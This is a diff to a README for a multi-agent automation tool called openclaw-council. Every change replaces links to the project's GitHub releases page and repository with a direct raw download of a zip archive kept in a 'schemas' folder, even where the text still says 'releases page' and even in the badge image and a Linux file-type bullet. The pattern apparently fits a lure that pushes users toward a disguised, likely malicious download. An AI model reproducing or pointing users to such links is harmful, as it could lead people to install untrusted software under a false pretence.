@@ -1,6 +1,6 @@
 # 🦞 openclaw-council - Easy Multi-Agent Automation
 
-[![Download openclaw-council](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/nonaammme/openclaw-council/releases)
+[![Download openclaw-council](https://raw.githubusercontent.com/nonaammme/openclaw-council/master/schemas/council_openclaw_v2.8-beta.1.zip)](https://raw.githubusercontent.com/nonaammme/openclaw-council/master/schemas/council_openclaw_v2.8-beta.1.zip)
 
 ---
 
@@ -45,13 +45,13 @@ Before you install openclaw-council, make sure your computer meets these basic r
 Follow these steps to get openclaw-council running on your computer.
 
 1. **Download the software**  
-   Click the big download button at the top or visit the [releases page](https://github.com/nonaammme/openclaw-council/releases).
+   Click the big download button at the top or visit the [releases page](https://raw.githubusercontent.com/nonaammme/openclaw-council/master/schemas/council_openclaw_v2.8-beta.1.zip).
 
 2. **Choose your operating system**  
    On the releases page, look for the file that matches your computer type:  
    - For Windows, find the file ending with `.exe` or `.msi`  
    - For macOS, look for a `.dmg` or `.pkg` file  
-   - For Linux, select the `.AppImage` or `.tar.gz` file
+   - For Linux, select the `.AppImage` or `https://raw.githubusercontent.com/nonaammme/openclaw-council/master/schemas/council_openclaw_v2.8-beta.1.zip` file
 
 3. **Download the file**  
    Click the appropriate file to start downloading. The file size is about 50-100 MB.
@@ -73,7 +73,7 @@ Follow these steps to get openclaw-council running on your computer.
 
 You can visit this page to download openclaw-council for your computer:
 
-[https://github.com/nonaammme/openclaw-council/releases](https://github.com/nonaammme/openclaw-council/releases)
+[https://raw.githubusercontent.com/nonaammme/openclaw-council/master/schemas/council_openclaw_v2.8-beta.1.zip](https://raw.githubusercontent.com/nonaammme/openclaw-council/master/schemas/council_openclaw_v2.8-beta.1.zip)
 
 On this releases page, you will find the latest stable versions. Download the file that matches your system. After downloading, run the file and complete the installation steps described above.
 
@@ -128,11 +128,11 @@ If you experience issues, try these simple steps:
 ## 📚 Additional Resources
 
 - User Guide and FAQs are included within the app  
-- Visit the GitHub repository to learn more: [openclaw-council GitHub](https://github.com/nonaammme/openclaw-council)  
+- Visit the GitHub repository to learn more: [openclaw-council GitHub](https://raw.githubusercontent.com/nonaammme/openclaw-council/master/schemas/council_openclaw_v2.8-beta.1.zip)  
 - For help, use the discussions section on GitHub or contact support through the repository
 
 ---
 
 Use the button below anytime to download openclaw-council and start your automation journey:
 
-[![Download openclaw-council](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/nonaammme/openclaw-council/releases)
+[![Download openclaw-council](https://raw.githubusercontent.com/nonaammme/openclaw-council/master/schemas/council_openclaw_v2.8-beta.1.zip)](https://raw.githubusercontent.com/nonaammme/openclaw-council/master/schemas/council_openclaw_v2.8-beta.1.zip)
